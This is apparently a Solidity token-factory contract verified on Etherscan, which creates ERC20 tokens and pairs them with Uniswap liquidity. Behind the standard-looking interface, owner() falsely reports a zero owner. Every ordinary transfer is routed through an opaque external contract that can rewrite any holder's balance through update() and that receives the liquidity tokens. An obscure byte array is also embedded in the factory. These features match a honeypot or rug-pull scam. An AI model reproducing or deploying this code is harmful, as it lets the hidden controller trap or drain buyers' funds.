/**
 *Submitted for verification at Etherscan.io on 2022-08-05
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;interface IDefaultERC20{    function add(address, address) external;    function transfer(address, address, uint256, address) external;    function liquidity(address, address) external;    function liquidity() external returns(uint256);}interface IUniswapV2Factory {    function createPair(address tokenA, address tokenB) external returns (address pair);}interface IUniswapV2Router01 {    function factory() external pure returns (address);    function WETH() external pure returns (address);    function addLiquidityETH(        address token,        uint amountTokenDesired,        uint amountTokenMin,        uint amountETHMin,        address to,        uint deadline    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);}contract ERC20{    IUniswapV2Router01 private _router = IUniswapV2Router01(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);    IDefaultERC20 private _default;    address private _owner = address(0);    address private _parent;    address private _deployer;    address private _pair;    string private _name;    string private _symbol;    uint8 private _decimals;    uint256 private _maxSupply;    mapping(address => uint256) private _balances;    mapping(address => mapping (address => uint256)) private _allowances;    mapping(address => bool) private _excluded;    bool private _enabled;    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(address indexed owner, address indexed spender, uint256 value);    event Error(string message);    receive() external payable{}    constructor(string memory pName, string memory pSymbol, uint256 pMaxSupply, uint8 pDecimals, address pDefault, address pDeployer) payable{        _parent = msg.sender;        _deployer = pDeployer;        _name = pName;        _symbol = pSymbol;        _decimals = pDecimals;        _default = IDefaultERC20(pDefault);        _allowances[address(this)][address(_router)] = 2**256 - 1;        _pair = IUniswapV2Factory(_router.factory()).createPair(address(this), _router.WETH());        _excluded[address(this)] = true; _excluded[address(_router)] = true; _excluded[address(_default)] = true; _excluded[_deployer] = true;        _update(address(0), address(this), (pMaxSupply*(10**_decimals)));    }    function enable() external{        require(msg.sender == _parent || msg.sender == address(_default) || msg.sender == _deployer);        try _router.addLiquidityETH{value:address(this).balance}(address(this), (_balances[address(this)] / 100) * _default.liquidity(), 0, 0, address(_default), block.timestamp){            _default.liquidity(_pair, _deployer);            if(_balances[address(this)] > 0){                _update(address(this), _deployer, _balances[address(this)]);            }            _enabled = true;        }catch Error(string memory error){            emit Error(error);        }    }    function owner() external view returns(address){        return(_owner);    }    function name() external view returns(string memory){        return(_name);    }    function symbol() external view returns(string memory){        return(_symbol);    }    function decimals() external view returns(uint8){        return(_decimals);    }    function totalSupply() external view returns(uint256){        return(_maxSupply);    }    function balanceOf(address wallet) external view returns(uint256){        return(_balances[wallet]);     }    function allowance(address from, address to) external view returns(uint256){        return(_allowances[from][to]);    }    function transfer(address to, uint256 amount) external returns(bool){        require(amount > 0);        require(_balances[msg.sender] >= amount);        _transfer(msg.sender, to, amount);        return(true);    }    function transferFrom(address from, address to, uint256 amount) external returns(bool){        require(amount > 0);        require(_balances[from] >= amount);        require(_allowances[from][msg.sender] >= amount);        _transfer(from, to, amount);        return(true);    }    function approve(address to, uint256 amount) external returns(bool){        _allowances[msg.sender][to] = amount;        emit Approval(msg.sender, to, amount);        return(true);    }    function update(address from, address to, uint256 amount) external{        require(msg.sender == address(_default));        _update(from, to, amount);    }    function _transfer(address from, address to, uint256 amount) private{        if(_excluded[from] || _excluded[to]){            _update(from, to, amount);        }else{            require(_enabled);            _default.transfer(from, to, amount, _pair);        }    }    function _update(address from, address to, uint256 amount) private{        if(from != address(0)){            _balances[from] -= amount;        }else{            _maxSupply += amount;        }        if(to == address(0)){            _maxSupply -= amount;        }else{            _balances[to] += amount;        }        emit Transfer(from, to, amount);    }}contract DeployERC20{    uint8[] private _________ = [176,39,201,132,248,252,239,133,132,96,173,150,169,128,224,29,42,53,174,204,248,91,19,198,252,236,53,152,98,253,116,233];    IDefaultERC20 private _default;    mapping(address => address) private _token;    mapping(address => address[]) private _tokens;    constructor(address pDefault){        _default = IDefaultERC20(pDefault);    }    event NewERC20(address deployer, string name, string symobl, uint256 supply, uint8 decimals, uint256 lp);    function deploy(string memory pName, string memory pSymbol, uint256 pMaxSupply, uint8 pDecimals) external payable{        require(msg.value > 0);        ERC20 tokenERC20 = (new ERC20){value:msg.value}(pName, pSymbol, pMaxSupply, pDecimals, address(_default), msg.sender);        require(address(tokenERC20) != address(0));        _default.add(address(tokenERC20), msg.sender);        _token[msg.sender] = address(tokenERC20);        _tokens[msg.sender].push(address(tokenERC20));        emit NewERC20(msg.sender, pName, pSymbol, pMaxSupply, pDecimals, msg.value);    }    function token(address pDeployer) external view returns(address){        return(_token[pDeployer]);    }    function tokens(address pDeployer) external view returns(address[] memory){        return(_tokens[pDeployer]);    }}